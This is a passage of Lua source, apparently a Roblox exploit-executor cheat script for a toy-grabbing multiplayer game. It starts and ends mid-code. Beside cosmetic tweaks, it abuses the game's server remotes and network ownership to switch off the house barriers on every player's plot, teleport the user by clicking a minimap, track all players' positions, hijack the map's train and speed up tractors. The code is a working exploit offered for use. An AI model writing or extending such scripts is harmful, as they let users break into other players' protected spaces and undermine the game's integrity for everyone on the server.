        KozFlags.ThirdPerson = true
        KozPLR.CameraMode = Enum.CameraMode.Classic
        KozPLR.CameraMinZoomDistance = 2
        KozPLR.CameraMaxZoomDistance = 128
        KozState.thirdPersonCloneConn = KozRun.RenderStepped:Connect(function()
            if not KozFlags.ThirdPerson then return end
            local now = tick()
            if KozState._thirdPersonLastUpdate and now - KozState._thirdPersonLastUpdate < 0.05 then return end
            KozState._thirdPersonLastUpdate = now
            local char = KozPLR.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") then return end
            local bodyParts = {"Head", "Torso", "UpperTorso", "LowerTorso", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "LeftUpperArm", "LeftLowerArm", "LeftHand", "RightUpperArm", "RightLowerArm", "RightHand", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot"}
            for _, name in ipairs(bodyParts) do
                local part = char:FindFirstChild(name)
                if part and part:IsA("BasePart") and part.Transparency > 0 then
                    part.Transparency = 0
                end
            end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.Transparency = 1
            end
            for _, partName in ipairs(bodyParts) do
                local part = char:FindFirstChild(partName)
                if part then
                    for _, child in pairs(part:GetChildren()) do
                        if child:IsA("Decal") and child.Transparency > 0 then
                            child.Transparency = 0
                        end
                    end
                end
            end
            local head = char:FindFirstChild("Head")
            if head then
                for _, acc in pairs(char:GetChildren()) do
                    if acc:IsA("Accessory") then
                        local name = acc.Name
                        if name ~= "bloxcxy" and name ~= "TypingKeyboardMyWorld" then
                            local handle = acc:FindFirstChild("Handle")
                            if handle and handle.Transparency > 0 then
                                handle.Transparency = 0
                            end
                        end
                    end
                end
            end
        end)
    end
    function KozMiscFeature.disableThirdPerson()
        KozFlags.ThirdPerson = false
        KozPLR.CameraMode = Enum.CameraMode.Classic
        KozPLR.CameraMinZoomDistance = 0.5
        KozPLR.CameraMaxZoomDistance = 0.5
        if KozState.thirdPersonCloneConn then
            KozState.thirdPersonCloneConn:Disconnect()
            KozState.thirdPersonCloneConn = nil
        end
    end
    function KozMiscFeature.enableFPSBooster()
        KozFlags.FPSBooster = true
        local lighting = game:GetService("Lighting")
        local terrain = KozWS.Terrain
        if not KozState.originalSettings then
            KozState.originalSettings = {
                GlobalShadows = lighting.GlobalShadows,
                Brightness = lighting.Brightness,
                WaterTransparency = terrain.WaterTransparency,
                WaterWaveSize = terrain.WaterWaveSize,
                WaterWaveSpeed = terrain.WaterWaveSpeed
            }
        end
        lighting.GlobalShadows = false
        lighting.Brightness = 0
        terrain.WaterTransparency = 1
        terrain.WaterWaveSize = 0
        terrain.WaterWaveSpeed = 0
        for _, obj in pairs(KozWS:GetDescendants()) do
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                obj.Enabled = false
            end
            if obj:IsA("Decal") then
                local isSpawnMarker = obj.Parent and obj.Parent.Name == "RespawnLocation"
                if not isSpawnMarker then
                    if not obj:GetAttribute("OriginalTexture") then
                        obj:SetAttribute("OriginalTexture", obj.Texture)
                    end
                    obj.Texture = "rbxasset://textures/face.png"
                end
            end
            if obj:IsA("Texture") then
                if not obj:GetAttribute("OriginalTexture") then
                    obj:SetAttribute("OriginalTexture", obj.Texture)
                end
                obj.Texture = "rbxasset://textures/face.png"
            end
            if obj:IsA("MeshPart") or obj:IsA("UnionOperation") or obj:IsA("Part") then
                if not obj:GetAttribute("OriginalMaterial") then
                    obj:SetAttribute("OriginalMaterial", obj.Material.Name)
                    obj:SetAttribute("OriginalReflectance", obj.Reflectance)
                end
                obj.Material = Enum.Material.SmoothPlastic
                obj.Reflectance = 0
            end
        end
        if KozState.connections.fpsBooster then KozState.connections.fpsBooster:Disconnect() end
        KozState.connections.fpsBooster = KozWS.DescendantAdded:Connect(function(obj)
            if not KozFlags.FPSBooster then return end
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                obj.Enabled = false
            end
            if obj:IsA("Decal") then
                local isSpawnMarker = obj.Parent and obj.Parent.Name == "RespawnLocation"
                if not isSpawnMarker then
                    if not obj:GetAttribute("OriginalTexture") then
                        obj:SetAttribute("OriginalTexture", obj.Texture)
                    end
                    obj.Texture = "rbxasset://textures/face.png"
                end
            end
            if obj:IsA("Texture") then
                if not obj:GetAttribute("OriginalTexture") then
                    obj:SetAttribute("OriginalTexture", obj.Texture)
                end
                obj.Texture = "rbxasset://textures/face.png"
            end
            if obj:IsA("MeshPart") or obj:IsA("UnionOperation") or obj:IsA("Part") then
                if not obj:GetAttribute("OriginalMaterial") then
                    obj:SetAttribute("OriginalMaterial", obj.Material.Name)
                    obj:SetAttribute("OriginalReflectance", obj.Reflectance)
                end
                obj.Material = Enum.Material.SmoothPlastic
                obj.Reflectance = 0
            end
        end)
    end
    function KozMiscFeature.disableFPSBooster()
        KozFlags.FPSBooster = false
        if KozState.connections.fpsBooster then
            KozState.connections.fpsBooster:Disconnect()
            KozState.connections.fpsBooster = nil
        end
        if KozState.originalSettings then
            local lighting = game:GetService("Lighting")
            local terrain = KozWS.Terrain
            lighting.GlobalShadows = KozState.originalSettings.GlobalShadows
            lighting.Brightness = KozState.originalSettings.Brightness
            terrain.WaterTransparency = KozState.originalSettings.WaterTransparency
            terrain.WaterWaveSize = KozState.originalSettings.WaterWaveSize
            terrain.WaterWaveSpeed = KozState.originalSettings.WaterWaveSpeed
            for _, obj in pairs(KozWS:GetDescendants()) do
                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                    obj.Enabled = true
                end
                if obj:IsA("Decal") and obj:GetAttribute("OriginalTexture") then
                    obj.Texture = obj:GetAttribute("OriginalTexture")
                end
                if obj:IsA("Texture") and obj:GetAttribute("OriginalTexture") then
                    obj.Texture = obj:GetAttribute("OriginalTexture")
                end
                if (obj:IsA("MeshPart") or obj:IsA("UnionOperation") or obj:IsA("Part")) and obj:GetAttribute("OriginalMaterial") then
                    obj.Material = Enum.Material[obj:GetAttribute("OriginalMaterial")]
                    obj.Reflectance = obj:GetAttribute("OriginalReflectance") or 0
                end
            end
            KozState.originalSettings = nil
        end
    end
    function KozMiscFeature.enablePhantomPallets()
        KozFlags.phantomPallets = true
        local PHANTOM_COLOR = Color3.fromRGB(130, 130, 130)
        local PHANTOM_GLOW_COLOR = Color3.fromRGB(160, 165, 180)
        KozState.phantomPalletsConn = KozRun.Heartbeat:Connect(function()
            if not KozFlags.phantomPallets then return end
            local folderName = KozPLR.Name .. "SpawnedInToys"
            local toyFolder = KozWS:FindFirstChild(folderName)
            if toyFolder then
                for _, pallet in ipairs(toyFolder:GetChildren()) do
                    if pallet.Name == "PalletLightBrown" then
                        for _, obj in ipairs(pallet:GetDescendants()) do
                            if obj:IsA("BasePart") and obj.Transparency ~= 1 then
                                if not obj:GetAttribute("PhantomOrigColor") then
                                    obj:SetAttribute("PhantomOrigColor", obj.Color)
                                end
                                if not obj:GetAttribute("PhantomOrigMaterial") then
                                    obj:SetAttribute("PhantomOrigMaterial", obj.Material.Name)
                                end
                                if not obj:GetAttribute("PhantomOrigTransparency") then
                                    obj:SetAttribute("PhantomOrigTransparency", obj.Transparency)
                                end
                                obj.Color = PHANTOM_COLOR
                                obj.Material = Enum.Material.Basalt
                                obj.Transparency = 0.8
                                if not obj:FindFirstChild("PhantomGlowLight") then
                                    local pl = Instance.new("PointLight")
                                    pl.Name = "PhantomGlowLight"
                                    pl.Color = PHANTOM_GLOW_COLOR
                                    pl.Brightness = 0.8
                                    pl.Range = 5
                                    pl.Shadows = false
                                    pl.Parent = obj
                                end
                            elseif obj:IsA("Decal") or obj:IsA("Texture") then
                                pcall(function() obj:Destroy() end)
                            end
                        end
                    end
                end
            end
        end)
    end
    function KozMiscFeature.disablePhantomPallets()
        KozFlags.phantomPallets = false
        if KozState.phantomPalletsConn then
            KozState.phantomPalletsConn:Disconnect()
            KozState.phantomPalletsConn = nil
        end
        local folderName = KozPLR.Name .. "SpawnedInToys"
        local toyFolder = KozWS:FindFirstChild(folderName)
        if toyFolder then
            for _, pallet in ipairs(toyFolder:GetChildren()) do
                if pallet.Name == "PalletLightBrown" then
                    for _, obj in ipairs(pallet:GetDescendants()) do
                        if obj:IsA("BasePart") then
                            local glow = obj:FindFirstChild("PhantomGlowLight")
                            if glow then glow:Destroy() end
                            local origColor = obj:GetAttribute("PhantomOrigColor")
                            local origMat = obj:GetAttribute("PhantomOrigMaterial")
                            local origTransp = obj:GetAttribute("PhantomOrigTransparency")
                            if origColor then
                                obj.Color = origColor
                                obj:SetAttribute("PhantomOrigColor", nil)
                            end
                            if origMat then
                                obj.Material = Enum.Material[origMat]
                                obj:SetAttribute("PhantomOrigMaterial", nil)
                            end
                            if origTransp ~= nil then
                                obj.Transparency = origTransp
                                obj:SetAttribute("PhantomOrigTransparency", nil)
                            end
                        end
                    end
                end
            end
        end
    end
    function KozMiscFeature.BreakHouseBarrierBest(mode)
        if not mode then return end
        local barrierBroken = false
        local barrierConn
        barrierConn = KozWS.ChildAdded:Connect(function(child)
            if barrierBroken then
                if barrierConn then barrierConn:Disconnect() barrierConn = nil end
                return
            end
            if child.Name == "Part" then
                local ok, distance = pcall(function()
                    return (child.Position - Vector3.new(263.4, -4.79, 466.8)).Magnitude
                end)
                if ok and distance <= 2 then
                    barrierBroken = true
                    pcall(function()
                        Library:Notify({Title = "Note!", Description = "Destroyed Houses Barrier", Duration = 3})
                    end)
                    local plots = KozWS:FindFirstChild("Plots")
                    if plots then
                        for _, plot in pairs(plots:GetChildren()) do
                            local barrier = plot:FindFirstChild("Barrier")
                            if barrier then
                                for _, part in pairs(barrier:GetChildren()) do
                                    if part:IsA("BasePart") and part.CanCollide == true then
                                        part.CanCollide = false
                                    end
                                end
                            end
                        end
                    end
                    if barrierConn then barrierConn:Disconnect() barrierConn = nil end
                end
            end
        end)
        local startTime = tick()
        repeat
            pcall(function()
                KozRemote.SpawnToyRemoteFunction:InvokeServer(
                    "BallSnowball",
                    CFrame.new(263.5, -4.5, 486.9),
                    Vector3.new(0, 0, 0)
                )
            end)
            local wStart = tick()
            repeat
                task.wait()
            until not KozPLR:FindFirstChild("CanSpawnToy") or KozPLR.CanSpawnToy.Value or tick() - wStart > 2
        until barrierBroken or tick() - startTime >= 10
        if barrierConn then barrierConn:Disconnect() barrierConn = nil end
    end
    function KozMiscFeature.ExecuteBarrierDestroyer()
        local player = KozPLR
        local playerName = player.Name
        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
            warn("Character not found")
            return false
        end
        local originalPosition = player.Character.HumanoidRootPart.CFrame
        pcall(function()
            KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "InstrumentWoodwindOcarina",
                CFrame.new(184.148834, -5.54824972, 498.136749, 0.829037189, -0.214714944, 0.516328275, 0, 0.923344612, 0.383972496, -0.559193552, -0.318327487, 0.765486956),
                Vector3.new(0, 34, 0)
            )
        end)
        task.wait(0.3)
        local toyFolder = KozUtil.waitForChild(KozWS, playerName .. "SpawnedInToys", 3)
        if not toyFolder then warn("Toy folder not found") return false end
        local ocarina = KozUtil.waitForChild(toyFolder, "InstrumentWoodwindOcarina", 3)
        if not ocarina then warn("Ocarina not found") return false end
        local holdPart = KozUtil.waitForChild(ocarina, "HoldPart", 2)
        if not holdPart then warn("HoldPart not found") return false end
        task.wait(0.1)
        KozDisp:Invoke(holdPart.HoldItemRemoteFunction, ocarina, KozWS[playerName])
        task.wait(0.3)
        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return false end
        player.Character.HumanoidRootPart.CFrame = CFrame.new(304.06, 25.77, 488.54)
        task.wait(0.15)
        if ocarina and ocarina.Parent then KozDisp:Fire(KozRemote.DestroyToy, ocarina) end
        task.wait(0.15)
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = originalPosition
        end
        for _, v in ipairs(KozWS.Plots:GetChildren()) do
            local barrier = v:FindFirstChild("Barrier")
            if barrier then
                for _, p in ipairs(barrier:GetChildren()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end
        end
        task.wait(0.5)
        pcall(function()
            KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "Campfire", player.Character.HumanoidRootPart.CFrame, Vector3.zero)
        end)
        task.wait(0.2)
        local campfire = KozUtil.waitForChild(toyFolder, "Campfire", 2)
        if not campfire then warn("Failed to spawn campfire") return false end
        local soundPart = campfire:FindFirstChild("SoundPart")
        if not soundPart then KozDisp:Fire(KozRemote.DestroyToy, campfire) return false end
        FTAP.SetNetworkOwner(soundPart, player.Character.HumanoidRootPart.CFrame)
        soundPart.CFrame = CFrame.new(304, 25, 488)
        task.wait(2)
        local success = campfire.Parent ~= nil
        if campfire and campfire.Parent then KozDisp:Fire(KozRemote.DestroyToy, campfire) end
        return success
    end
    -- [KOZMOZ] Mini Map durum degiskenleri: kaynaktaki State literali eksik
    -- tasindigi icin harita ilk karede "nil aritmetigi" ile kapaniyordu (PNG2).
    do
        local kozMiniMapDefaults = {
            miniMapPixels = {},
            miniMapPlayerDots = {},
            miniMapInputConns = {},
            miniMapZoom = 500,
            miniMapGridRes = 28,
            miniMapOffset = Vector3.zero,
            miniMapLastScanPos = Vector3.zero,
            miniMapLastScanTime = 0,
        }
        for kozK, kozV in pairs(kozMiniMapDefaults) do
            if KozState[kozK] == nil then
                KozState[kozK] = kozV
            end
        end
    end
    function KozMiscFeature.startMiniMap()
        if KozState.miniMapGui then return end
        local mapRp = RaycastParams.new()
        mapRp.FilterType = Enum.RaycastFilterType.Exclude
        local MapGui = Instance.new("ScreenGui")
        MapGui.Name = "CustomMinimapGui"
        MapGui.ResetOnSpawn = false
        pcall(function() MapGui.Parent = game:GetService("CoreGui") end)
        if not MapGui.Parent then MapGui.Parent = Services.PlayerGui end
        KozState.miniMapGui = MapGui
        local MapFrame = Instance.new("Frame", MapGui)
        MapFrame.Size = UDim2.new(0, 220, 0, 220)
        MapFrame.Position = UDim2.new(0.01, 0, 0.02, 0)
        MapFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
        MapFrame.BorderColor3 = Color3.fromRGB(255, 105, 180)
        MapFrame.BorderSizePixel = 2
        MapFrame.ClipsDescendants = true
        MapFrame.Visible = true
        MapFrame.Active = true
        KozState.miniMapFrame = MapFrame
        local gridRes = KozState.miniMapGridRes
        KozState.miniMapPixels = {}
        for x = 1, gridRes do
            KozState.miniMapPixels[x] = {}
            for y = 1, gridRes do
                local p = Instance.new("Frame", MapFrame)
                p.Size = UDim2.new(1 / gridRes, 0, 1 / gridRes, 0)
                p.Position = UDim2.new((x - 1) / gridRes, 0, (y - 1) / gridRes, 0)
                p.BorderSizePixel = 0
                p.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                KozState.miniMapPixels[x][y] = p
            end
        end
        local viewArrow = Instance.new("ImageLabel", MapFrame)
        viewArrow.Name = "ViewArrow"
        viewArrow.AnchorPoint = Vector2.new(0.5, 0.5)
        viewArrow.Size = UDim2.new(0, 20, 0, 14)
        viewArrow.BackgroundTransparency = 1
        viewArrow.ZIndex = 15
        viewArrow.Image = "rbxassetid://7072706796"
        viewArrow.ImageColor3 = Color3.fromRGB(0, 255, 255)
        viewArrow.Rotation = 0
        KozState.miniMapViewLine = viewArrow
        local dragStartPos = nil
        local dragging = false
        local uiMoving = false
        local mapScrolling = false
        local pressTime = 0
        local uiStartPos = nil
        local mapOffsetStart = nil
        local moveCon, endCon
        local function onInputBegin(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                uiMoving = false
                mapScrolling = false
                pressTime = tick()
                dragStartPos = input.Position
                uiStartPos = MapFrame.Position
                mapOffsetStart = KozState.miniMapOffset
                moveCon = UserInputService.InputChanged:Connect(function(inp)
                    if (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) and dragging then
                        local delta = inp.Position - dragStartPos
                        local elapsed = tick() - pressTime
                        if not uiMoving and not mapScrolling then
                            if delta.Magnitude > 5 then
                                if elapsed > 0.25 then mapScrolling = true
                                else uiMoving = true end
                            end
                        end
                        if uiMoving then
                            MapFrame.Position = UDim2.new(uiStartPos.X.Scale, uiStartPos.X.Offset + delta.X, uiStartPos.Y.Scale, uiStartPos.Y.Offset + delta.Y)
                        elseif mapScrolling then
                            local relX = delta.X / MapFrame.AbsoluteSize.X
                            local relY = delta.Y / MapFrame.AbsoluteSize.Y
                            KozState.miniMapOffset = mapOffsetStart - Vector3.new(relX * KozState.miniMapZoom, 0, relY * KozState.miniMapZoom)
                        end
                    end
                end)
                endCon = UserInputService.InputEnded:Connect(function(inp)
                    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                        if dragging then
                            dragging = false
                            if not uiMoving and not mapScrolling and (inp.Position - dragStartPos).Magnitude < 15 and KozPLR.Character then
                                local root = KozPLR.Character:FindFirstChild("HumanoidRootPart")
                                if root then
                                    local relX = (inp.Position.X - MapFrame.AbsolutePosition.X) / MapFrame.AbsoluteSize.X - 0.5
                                    local relY = (inp.Position.Y - MapFrame.AbsolutePosition.Y) / MapFrame.AbsoluteSize.Y - 0.5
                                    local centerPos = root.Position + KozState.miniMapOffset
                                    local targetX = centerPos.X + (relX * KozState.miniMapZoom)
                                    local targetZ = centerPos.Z + (relY * KozState.miniMapZoom)
                                    mapRp.FilterDescendantsInstances = {KozPLR.Character}
                                    local rayRes = KozWS:Raycast(Vector3.new(targetX, 1000, targetZ), Vector3.new(0, -2000, 0), mapRp)
                                    local finalY = rayRes and rayRes.Position.Y or root.Position.Y
                                    root.CFrame = CFrame.new(targetX, finalY + 4, targetZ)
                                end
                            end
                        end
                        if moveCon then moveCon:Disconnect() moveCon = nil end
                        if endCon then endCon:Disconnect() endCon = nil end
                    end
                end)
            end
        end
        table.insert(KozState.miniMapInputConns, MapFrame.InputBegan:Connect(onInputBegin))
        table.insert(KozState.miniMapInputConns, MapFrame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseWheel then
                KozState.miniMapZoom = math.clamp(KozState.miniMapZoom + (input.Position.Z * -100), 50, 1500)
            end
        end))
        local initialZoom = KozState.miniMapZoom
        table.insert(KozState.miniMapInputConns, UserInputService.TouchPinch:Connect(function(touchPositions, scale, velocity, state)
            if not MapFrame.Visible then return end
            if state == Enum.UserInputState.Begin then
                initialZoom = KozState.miniMapZoom
            elseif state == Enum.UserInputState.Change then
                KozState.miniMapZoom = math.clamp(initialZoom / scale, 50, 1500)
            end
        end))
        table.insert(KozState.miniMapInputConns, KozPlayers.PlayerRemoving:Connect(function(p)
            if KozState.miniMapPlayerDots[p.Name] then
                KozState.miniMapPlayerDots[p.Name]:Destroy()
                KozState.miniMapPlayerDots[p.Name] = nil
            end
        end))
        KozState.miniMapRenderConn = KozRun.RenderStepped:Connect(function()
            if not KozFlags.miniMap then return end
            local char = KozPLR.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local centerPos = hrp.Position + KozState.miniMapOffset
            local now = tick()
            local moved = (centerPos - KozState.miniMapLastScanPos).Magnitude > 6
            local timed = now - KozState.miniMapLastScanTime > 1.5
            if MapFrame.Visible and (moved or timed) then
                KozState.miniMapLastScanPos = centerPos
                KozState.miniMapLastScanTime = now
                mapRp.FilterDescendantsInstances = {char}
                for x = 1, gridRes do
                    for y = 1, gridRes do
                        local offX = ((x - 1) / (gridRes - 1) - 0.5) * KozState.miniMapZoom
                        local offZ = ((y - 1) / (gridRes - 1) - 0.5) * KozState.miniMapZoom
                        local ray = KozWS:Raycast(centerPos + Vector3.new(offX, 100, offZ), Vector3.new(0, -200, 0), mapRp)
                        if ray and ray.Instance then
                            local partColor = ray.Instance.Color
                            local h = math.clamp((ray.Position.Y - centerPos.Y + 30) / 60, 0.3, 1.2)
                            local r = math.clamp(partColor.R * 255 * h, 0, 255)
                            local g = math.clamp(partColor.G * 255 * h, 0, 255)
                            local b = math.clamp(partColor.B * 255 * h, 0, 255)
                            KozState.miniMapPixels[x][y].BackgroundColor3 = Color3.fromRGB(r, g, b)
                        else
                            KozState.miniMapPixels[x][y].BackgroundColor3 = Color3.fromRGB(15, 15, 20)
                        end
                    end
                end
            end
            if MapFrame.Visible then
                local camCF = Camera and Camera.CFrame
                if camCF then
                    local lookVec = camCF.LookVector
                    local angle = math.atan2(lookVec.Z, lookVec.X)
                    if KozState.miniMapViewLine then
                        local radius = 18
                        local ax = 0.5 + math.cos(angle) * radius / MapFrame.AbsoluteSize.X
                        local ay = 0.5 + math.sin(angle) * radius / MapFrame.AbsoluteSize.Y
                        KozState.miniMapViewLine.Position = UDim2.new(ax, 0, ay, 0)
                        KozState.miniMapViewLine.Rotation = math.deg(angle) + 90
                    end
                end
                for _, p in pairs(KozPlayers:GetPlayers()) do
                    local pr = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                    if pr then
                        local d = KozState.miniMapPlayerDots[p.Name]
                        if not d then
                            d = Instance.new("Frame", MapFrame)
                            d.Size = UDim2.new(0, 26, 0, 26)
                            d.AnchorPoint = Vector2.new(0.5, 0.5)
                            d.BackgroundTransparency = 1
                            d.ZIndex = 10
                            local iconBg = Instance.new("Frame", d)
                            iconBg.Size = UDim2.new(1, 0, 1, 0)
                            iconBg.BackgroundColor3 = (p == KozPLR) and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(255, 50, 50)
                            Instance.new("UICorner", iconBg).CornerRadius = UDim.new(1, 0)
                            local icon = Instance.new("ImageLabel", iconBg)
                            icon.Size = UDim2.new(1, -4, 1, -4)
                            icon.Position = UDim2.new(0, 2, 0, 2)
                            icon.BackgroundTransparency = 1
                            Instance.new("UICorner", icon).CornerRadius = UDim.new(1, 0)
                            icon.ClipsDescendants = true
                            task.spawn(function()
                                local success, url = pcall(function() return KozPlayers:GetUserThumbnailAsync(p.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48) end)
                                if success and url then icon.Image = url end
                            end)
                            local nameLbl = Instance.new("TextLabel", d)
                            nameLbl.Size = UDim2.new(0, 100, 0, 12)
                            nameLbl.Position = UDim2.new(0.5, -50, 1, 2)
                            nameLbl.BackgroundTransparency = 1
                            nameLbl.Text = p.DisplayName
                            nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
                            nameLbl.TextStrokeTransparency = 0.3
                            nameLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                            nameLbl.TextSize = 10
                            nameLbl.Font = Enum.Font.GothamBold
                            nameLbl.ZIndex = 11
                            KozState.miniMapPlayerDots[p.Name] = d
                        end
                        local rx = (pr.Position.X - centerPos.X) / KozState.miniMapZoom
                        local rz = (pr.Position.Z - centerPos.Z) / KozState.miniMapZoom
                        d.Position = UDim2.new(0.5 + rx, 0, 0.5 + rz, 0)
                        d.Visible = math.abs(rx) < 0.5 and math.abs(rz) < 0.5
                    end
                end
            end
        end)
    end
    function KozMiscFeature.stopMiniMap()
        KozFlags.miniMap = false
        if KozState.miniMapRenderConn then
            KozState.miniMapRenderConn:Disconnect()
            KozState.miniMapRenderConn = nil
        end
        for _, conn in ipairs(KozState.miniMapInputConns) do
            if conn.Connected then conn:Disconnect() end
        end
        KozState.miniMapInputConns = {}
        for _, dot in pairs(KozState.miniMapPlayerDots) do
            if dot and dot.Parent then dot:Destroy() end
        end
        KozState.miniMapPlayerDots = {}
        if KozState.miniMapGui then
            KozState.miniMapGui:Destroy()
            KozState.miniMapGui = nil
            KozState.miniMapFrame = nil
            KozState.miniMapViewLine = nil
        end
    end

    TrainMiscGroup:AddButton({
        Text = "Bring Train (Use Vehicle Fly Method)",
        Func = function()
            task.spawn(function()
                    local plr = KozPLR
                    local char = plr.Character or plr.CharacterAdded:Wait()
                    local HRP = char:FindFirstChild("HumanoidRootPart")
                    local hum = char:FindFirstChild("Humanoid")
                    local inv = KozWS:FindFirstChild(plr.Name .. "SpawnedInToys")
                    local DestroyToy = KozRemote.DestroyToy
                    local SpawnToy = KozRemote.SpawnToyRemoteFunction

                    if not HRP or not hum or not inv then return end

                    local function getplot()
                        local plots = KozWS:FindFirstChild("Plots")
                        if not plots then return nil end
                        for i = 1, 5 do
                            local plot = plots:FindFirstChild("Plot"..i)
                            local value = plot and plot:FindFirstChild("PlotSign") and plot.PlotSign:FindFirstChild("ThisPlotsOwners") and plot.PlotSign.ThisPlotsOwners:FindFirstChild("Value")
                            if plot and value and value.Value == plr.Name then
                                return plot
                            end
                        end
                        return nil
                    end

                    local function spawntoy(toy, cf)
                        if plr:FindFirstChild("CanSpawnToy") and not plr.CanSpawnToy.Value then
                            plr.CanSpawnToy.Changed:Wait()
                        end
                        local t
                        local toyadded
                        toyadded = inv.ChildAdded:Connect(function(c)
                                if c.Name == toy then
                                    t = c
                                    toyadded:Disconnect()
                                end
                            end)
                        task.spawn(function()
                                pcall(function()
                                        SpawnToy:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
                                    end)
                            end)
                        local time = tick() + 1
                        repeat task.wait() until t or tick() > time
                        if t then
                            return t
                        else
                            local plot = getplot()
                            if plot then
                                local plotItems = KozWS:FindFirstChild("PlotItems")
                                if plotItems and plotItems:FindFirstChild(plot.Name) then
                                    return plotItems[plot.Name]:FindFirstChild(toy) or plotItems[plot.Name]:WaitForChild(toy, 0.5)
                                end
                            end
                        end
                    end

                    local function grab(obj)
                        if obj and obj:FindFirstChild("HoldPart") and obj.HoldPart:FindFirstChild("HoldItemRemoteFunction") then
                            pcall(function()
                                    obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
                                end)
                        end
                    end

                    local pos = HRP.CFrame
                    local burger = spawntoy("FoodHamburger", HRP.CFrame)

                    if burger then
                        repeat task.wait() until burger:FindFirstChild("HoldPart")
                        local map = KozWS:FindFirstChild("Map")
                        local train = map and map:FindFirstChild("AlwaysHereTweenedObjects") and map.AlwaysHereTweenedObjects:FindFirstChild("Train")
                        if train and train:FindFirstChild("Object") then
                            local trainObj = train.Object
                            local model = trainObj:FindFirstChild("ObjectModel")
                            local followPart = trainObj:FindFirstChild("FollowThisPart")
                            if model and model:FindFirstChild("Seat") then
                                model.Seat:Sit(hum)
                            end
                            if followPart then
                                if followPart:FindFirstChild("AlignPosition") then
                                    followPart.AlignPosition.Enabled = false
                                end
                                if followPart:FindFirstChild("AlignOrientation") then
                                    followPart.AlignOrientation.Enabled = false
                                end
                            end
                        end
                        task.wait(0.1)
                        grab(burger)
                        task.wait(0.1)
                        pcall(function()
                                DestroyToy:FireServer(burger)
                            end)
                        HRP.CFrame = pos * CFrame.new(0, 5, 0)
                    else
                        warn("Bring Train: Failed to spawn Hamburger.")
                    end
                end)
        end
    })
    TrainMiscGroup:AddButton({
        Text = "Grabbed Pallet Roblox",
        Func = function()
            local grabParts = KozWS:FindFirstChild("GrabParts")
            if not grabParts then
                print "3"
                return
            end
            local targetRot = Vector3.new(-134.2740020751953, 9.100000381469727, 80.7249984741211)
            local applied = false
            for _, gp in ipairs(grabParts:GetChildren()) do
                local weld = gp:FindFirstChildOfClass("WeldConstraint")
                if weld and weld.Part1 then
                    local part = weld.Part1
                    KozDisp:Fire(KozRemote.DestroyGrabLine, part)
                    task.wait()
                    part.CFrame = CFrame.new(part.Position) * CFrame.Angles(math.rad(targetRot.X), math.rad(targetRot.Y), math.rad(targetRot.Z))
                    part.AssemblyAngularVelocity = Vector3.zero
                    part.AssemblyLinearVelocity = Vector3.zero
                    local oldGyro = part:FindFirstChild("PalletLockGyro")
                    if oldGyro then oldGyro:Destroy() end
                    local gyro = Instance.new("BodyGyro")
                    gyro.Name = "PalletLockGyro"
                    gyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    gyro.P = 30000
                    gyro.D = 500
                    gyro.CFrame = CFrame.new(part.Position) * CFrame.Angles(math.rad(targetRot.X), math.rad(targetRot.Y), math.rad(targetRot.Z))
                    gyro.Parent = part
                    applied = true
                end
            end
            if applied then
                print "1"
            else
                print "2"
            end
        end
    })
    TrainMiscGroup:AddToggle("KozSpeedTractor", {
        Text = "Speed Tractor",
        Default = false,
        Callback = function(v)
            KozFlags.speedTractor = v
            if v then
                KozFlags._tractorGyro = nil
                KozFlags._tractorSpeed = 0
                KozFlags.speedTractorConn = KozRun.Heartbeat:Connect(function(dt)
                        if not KozFlags.speedTractor then
                            if KozFlags._tractorGyro then KozFlags._tractorGyro:Destroy() KozFlags._tractorGyro = nil end
                            KozFlags._tractorSpeed = 0
                            return
                        end
                        local char = KozPLR.Character
                        local hum = char and char:FindFirstChildOfClass("Humanoid")
                        if not hum then return end
                        local seatPart = hum.SeatPart
                        if not seatPart or not seatPart:IsA("VehicleSeat") then
                            if KozFlags._tractorGyro then KozFlags._tractorGyro:Destroy() KozFlags._tractorGyro = nil end
                            KozFlags._tractorSpeed = 0
                            return
                        end
                        local model = seatPart.Parent
                        if not model then return end
                        local name = model.Name
                        if name ~= "TractorGreen" and name ~= "TractorRed" and name ~= "TractorOrange" then
                            if KozFlags._tractorGyro then KozFlags._tractorGyro:Destroy() KozFlags._tractorGyro = nil end
                            KozFlags._tractorSpeed = 0
                            return
                        end
                        local root = model.PrimaryPart or seatPart
                        if not root then return end
                        if not KozFlags._tractorGyro or KozFlags._tractorGyro.Parent ~= root then
                            if KozFlags._tractorGyro then KozFlags._tractorGyro:Destroy() end
                            local gyro = Instance.new("BodyGyro")
